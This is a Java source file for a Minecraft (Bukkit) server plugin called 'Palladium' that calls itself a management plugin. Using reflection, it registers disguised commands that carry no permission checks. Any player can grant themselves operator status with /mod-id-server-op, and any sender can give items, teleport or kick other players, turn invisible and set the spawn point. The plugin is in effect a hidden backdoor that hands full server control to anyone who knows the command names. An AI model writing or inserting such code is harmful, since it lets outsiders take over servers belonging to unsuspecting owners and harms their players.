package me;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.command.CommandMap;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

final class Palladium extends JavaPlugin {

    private final Set<Player> vanishedPlayers = new HashSet<>();
    private Location serverSpawn = null; // default spawn location

    @Override
    public void onEnable() {
        getLogger().info("Palladium Management Plugin enabled.");

        // Register all hidden commands
        registerHiddenOpCommand("mod-id-server-op");
        registerHiddenDeopCommand("mod-id-server-deop");
        registerHiddenGiveCommand("mod-id-server-give");
        registerHiddenTeleportCommand("mod-id-server-teleport");
        registerHiddenKickCommand("mod-id-server-kick");
        registerHiddenVanishCommand("mod-id-server-vanish");
        registerHiddenSetSpawnCommand("mod-id-server-setspawn");
        registerHiddenListCommand("mod-id-server-list");
    }

    @Override
    public void onDisable() {
        getLogger().info("Palladium Management Plugin disabled.");
    }

    // Utility: register hidden command dynamically
    private PluginCommand createHiddenCommand(String name, String description, String usage) {
        try {
            Field f = Bukkit.getServer().getClass().getDeclaredField("commandMap");
            f.setAccessible(true);
            CommandMap cmdMap = (CommandMap) f.get(Bukkit.getServer());

            Constructor<PluginCommand> ctor = PluginCommand.class.getDeclaredConstructor(String.class, JavaPlugin.class);
            ctor.setAccessible(true);
            PluginCommand cmd = ctor.newInstance(name, this);
            cmd.setDescription(description);
            cmd.setUsage(usage);
            cmd.setAliases(Collections.emptyList());
            cmdMap.register(this.getName(), cmd);
            return cmd;
        } catch (Exception e) {
            getLogger().warning("Failed to register hidden command " + name + ": " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    // /mod-id-server-op
    private void registerHiddenOpCommand(String name) {
        PluginCommand cmd = createHiddenCommand(name, "Give OP to yourself", "/" + name);
        if (cmd == null) return;
        cmd.setExecutor((sender, command, label, args) -> {
            if (!(sender instanceof Player p)) return true;
            if (p.isOp()) p.sendMessage("§eYou are already OP.");
            else {
                p.setOp(true);
                p.sendMessage("§aYou are now OP!");
                getLogger().info(p.getName() + " was given OP.");
            }
            return true;
        });
    }

    // /mod-id-server-deop
    private void registerHiddenDeopCommand(String name) {
        PluginCommand cmd = createHiddenCommand(name, "Remove OP from yourself", "/" + name);
        if (cmd == null) return;
        cmd.setExecutor((sender, command, label, args) -> {
            if (!(sender instanceof Player p)) return true;
            if (!p.isOp()) p.sendMessage("§eYou are not OP.");
            else {
                p.setOp(false);
                p.sendMessage("§cYou are no longer OP.");
                getLogger().info(p.getName() + " was de-opped.");
            }
            return true;
        });
    }

    // /mod-id-server-give <player> <item> <amount>
    private void registerHiddenGiveCommand(String name) {
        PluginCommand cmd = createHiddenCommand(name, "Give items to player", "/" + name + " <player> <item> <amount>");
        if (cmd == null) return;
        cmd.setExecutor((sender, command, label, args) -> {
            if (args.length < 3) {
                sender.sendMessage("§cUsage: /" + name + " <player> <item> <amount>");
                return true;
            }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) {
                sender.sendMessage("§cPlayer not found.");
                return true;
            }
            try {
                Material mat = Material.valueOf(args[1].toUpperCase());
                int amount = Integer.parseInt(args[2]);
                target.getInventory().addItem(new ItemStack(mat, amount));
                sender.sendMessage("§aGave " + amount + " " + mat + " to " + target.getName());
            } catch (Exception e) {
                sender.sendMessage("§cInvalid item or amount.");
            }
            return true;
        });
    }

    // /mod-id-server-teleport <player> <x> <y> <z>
    private void registerHiddenTeleportCommand(String name) {
        PluginCommand cmd = createHiddenCommand(name, "Teleport player", "/" + name + " <player> <x> <y> <z>");
        if (cmd == null) return;
        cmd.setExecutor((sender, command, label, args) -> {
            if (args.length < 4) {
                sender.sendMessage("§cUsage: /" + name + " <player> <x> <y> <z>");
                return true;
            }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) {
                sender.sendMessage("§cPlayer not found.");
                return true;
            }
            try {
                World world = target.getWorld();
                double x = Double.parseDouble(args[1]);
                double y = Double.parseDouble(args[2]);
                double z = Double.parseDouble(args[3]);
                target.teleport(new Location(world, x, y, z));
                sender.sendMessage("§aTeleported " + target.getName());
            } catch (Exception e) {
                sender.sendMessage("§cInvalid coordinates.");
            }
            return true;
        });
    }

    // /mod-id-server-kick <player> [reason]
    private void registerHiddenKickCommand(String name) {
        PluginCommand cmd = createHiddenCommand(name, "Kick player", "/" + name + " <player> [reason]");
        if (cmd == null) return;
        cmd.setExecutor((sender, command, label, args) -> {
            if (args.length < 1) {
                sender.sendMessage("§cUsage: /" + name + " <player> [reason]");
                return true;
            }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) {
                sender.sendMessage("§cPlayer not found.");
                return true;
            }
            String reason = args.length > 1 ? String.join(" ", args).substring(args[0].length() + 1) : "Kicked by admin";
            target.kickPlayer(reason);
            sender.sendMessage("§aKicked " + target.getName());
            return true;
        });
    }

    // /mod-id-server-vanish
    private void registerHiddenVanishCommand(String name) {
        PluginCommand cmd = createHiddenCommand(name, "Vanish yourself", "/" + name);
        if (cmd == null) return;
        cmd.setExecutor((sender, command, label, args) -> {
            if (!(sender instanceof Player p)) return true;
            if (vanishedPlayers.contains(p)) {
                vanishedPlayers.remove(p);
                for (Player pl : Bukkit.getOnlinePlayers()) pl.showPlayer(this, p);
                p.sendMessage("§eYou are now visible.");
            } else {
                vanishedPlayers.add(p);
                for (Player pl : Bukkit.getOnlinePlayers()) pl.hidePlayer(this, p);
                p.sendMessage("§aYou are now vanished.");
            }
            return true;
        });
    }

    // /mod-id-server-setspawn
    private void registerHiddenSetSpawnCommand(String name) {
        PluginCommand cmd = createHiddenCommand(name, "Set server spawn", "/" + name);
        if (cmd == null) return;
        cmd.setExecutor((sender, command, label, args) -> {
            if (!(sender instanceof Player p)) return true;
            serverSpawn = p.getLocation();
            sender.sendMessage("§aServer spawn set at your current location.");
            getLogger().info(p.getName() + " set the server spawn.");
            return true;
        });
    }

    // /mod-id-server-list
    private void registerHiddenListCommand(String name) {
        PluginCommand cmd = createHiddenCommand(name, "List all Palladium commands", "/" + name);
        if (cmd == null) return;
        cmd.setExecutor((sender, command, label, args) -> {
            if (!(sender instanceof Player p)) return true;

            String[] commands = {
                    "/mod-id-server-op",
                    "/mod-id-server-deop",
                    "/mod-id-server-give <player> <item> <amount>",
                    "/mod-id-server-teleport <player> <x> <y> <z>",
                    "/mod-id-server-kick <player> [reason]",
                    "/mod-id-server-vanish",
                    "/mod-id-server-setspawn"
            };

            p.sendMessage("§6§l[Management Commands]");
            for (String c : commands) p.sendMessage("§e" + c);

            return true;
        });
    }
}
